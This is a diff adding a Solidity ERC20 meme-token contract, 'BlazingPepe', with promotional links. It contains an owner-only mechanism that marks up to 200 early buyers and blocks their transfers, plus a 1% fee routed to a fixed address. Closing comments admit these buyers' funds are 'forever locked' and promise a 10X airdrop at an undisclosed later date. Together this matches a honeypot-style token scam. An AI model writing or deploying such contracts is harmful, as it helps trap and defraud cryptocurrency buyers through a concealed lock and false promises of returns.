@@ -1,0 +1,91 @@
+//      BBBBB   l          a     zzzzz  i  n   n ggggg    PPPP  eeeee  PPPP  eeeee
+//      B    B  l         a a       z   i  nn  n g   g    P   P e      P   P e
+//      BBBBB   l        aaaaa     z    i  n n n g        PPPP  eeee   PPPP  eeee
+//      B    B  l       a     a  z      i  n  nn g  ggg   P     e      P     e
+//      BBBBB   llllll a       a zzzzz  i  n   n gggggg   P     eeeee  P     eeeee
+
+// Website: https://www.blazingpepe.com/
+// Twitter: @BlazingPepe_eth
+// Logo: https://static.wixstatic.com/media/da5e64_20a74871b34643e39511224c1e683658~mv2.png/v1/fill/w_32,h_32,al_c,q_85,enc_auto/PFPUntitled%20design%20(55).png
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.9;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/utils/math/SafeMath.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+
+contract BlazingPepe is ERC20, Ownable {
+    using SafeMath for uint256;
+    using Address for address;
+
+    uint256 private constant burnPercentage = 1;
+    uint256 private constant feePercentage = 1;
+    address private constant feeAddress = 0xD5F346BCE4846e94C7600D54E487F810Dd53305e;
+    address private constant uniswapV2Router = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    uint256 private constant maxLockedBuyers = 200;
+
+    uint256 public totalTokensBurned;
+    bool public renounceEnabled = true;
+
+    mapping(address => bool) private isFirst200Buyer;
+    address[] private first200Buyers;
+
+    constructor() ERC20("BlazingPepe", unicode"🐸Pepe𝕏🟨") {
+        uint256 totalSupply = 420690000000000000000000000000000;
+        _mint(msg.sender, totalSupply);
+        isFirst200Buyer[msg.sender] = false;
+        isFirst200Buyer[feeAddress] = false;
+        isFirst200Buyer[uniswapV2Router] = false;
+    }
+
+    function _transferWithFee(address sender, address recipient, uint256 amount) internal {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+        require(amount > 0, "ERC20: transfer amount must be greater than zero");
+        require(balanceOf(sender) >= amount, "ERC20: insufficient balance");
+
+        uint256 burnAmount = amount.mul(burnPercentage).div(100);
+        uint256 feeAmount = amount.mul(feePercentage).div(100);
+
+        _burn(sender, burnAmount);
+        _transfer(sender, feeAddress, feeAmount);
+        _transfer(sender, recipient, amount.sub(burnAmount).sub(feeAmount));
+
+        totalTokensBurned = totalTokensBurned.add(burnAmount);
+    }
+
+    modifier canTransfer(address sender) {
+        require(
+            !isFirst200Buyer[sender] || sender == owner() || sender == feeAddress || sender == uniswapV2Router,
+            "Transfer not allowed for this address"
+        );
+        _;
+    }
+
+    function transfer(address recipient, uint256 amount) public override canTransfer(msg.sender) returns (bool) {
+        _transferWithFee(msg.sender, recipient, amount);
+        return true;
+    }
+
+    function addToFirst200Buyers(address buyer) external onlyOwner {
+        require(first200Buyers.length < maxLockedBuyers, "Maximum number of locked buyers reached");
+        isFirst200Buyer[buyer] = true;
+        first200Buyers.push(buyer);
+    }
+
+    function isUnlocked(address _address) public view returns (bool) {
+        return !isFirst200Buyer[_address];
+    }
+
+    function renounceOwnership() public override onlyOwner {
+        require(renounceEnabled, "Ownership renouncement is disabled");
+        super.renounceOwnership();
+    }
+}
+
+// Thank you to the first 200 Buyer's you've provided the initial liquidity for the Pool this will be forever locked! 
+//For your contribution you will recieve a 10X on your investment or more air dropped to you at a date to later be disclosed. 
+//If the address is a sniper bot we thank you;))!
+// We will call you The top 200 and the community as a whole, thank's you!
